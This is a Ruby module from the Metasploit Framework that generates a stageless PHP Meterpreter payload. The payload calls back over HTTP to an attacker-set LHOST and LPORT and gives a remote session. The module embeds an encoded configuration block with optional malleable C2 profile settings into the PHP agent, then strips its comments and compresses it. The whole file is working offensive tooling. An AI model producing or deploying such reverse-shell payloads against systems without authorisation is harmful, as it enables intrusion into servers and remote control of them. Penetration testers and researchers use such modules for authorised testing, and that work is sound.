##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php::ReverseHttp
  include Msf::Payload::TransportConfig
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Meterpreter, Reverse HTTP Inline',
        'Description' => 'Connect back to attacker and spawn a Meterpreter server via HTTP (PHP)',
        'Author' => 'OJ Reeves',
        'License' => MSF_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Handler' => Msf::Handler::ReverseHttp,
        'Session' => Msf::Sessions::Meterpreter_Php_Php
      )
    )

    register_options([
      OptString.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile']),
    ])
  end

  def generate_config(opts = {})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    opts[:transport_config] ||= [transport_config_reverse_http(opts)]

    config_opts = {
      ascii_str: true,
      null_session_guid: true,
      expiration: (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid: opts[:uuid],
      transports: opts[:transport_config],
      stageless: true,
    }.merge(meterpreter_logging_config(opts))

    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
    config.to_b
  end

  def generate_reverse_http(opts = {})
    opts[:uri_uuid_mode] = :init_connect

    ds = opts[:datastore] || datastore
    opts.merge!({
      host: ds['LHOST'] || '127.127.127.127',
      port: ds['LPORT']
    })
    opts[:scheme] = 'http' if opts[:scheme].nil?
    url = generate_callback_url(opts)

    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    config_block = Rex::Text.encode_base64(generate_config(
      url: url,
      scheme: opts[:scheme],
      c2_profile: datastore['MALLEABLEC2'],
      stageless: true
    ))
    met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")

    if datastore['MeterpreterDebugBuild']
      met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
      met.sub!(%q{define("MY_DEBUGGING_LOG_FILE_PATH", false);}, %|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
    end

    met.gsub!(/#.*$/, '')
    Rex::Text.compress(met)
  end
end
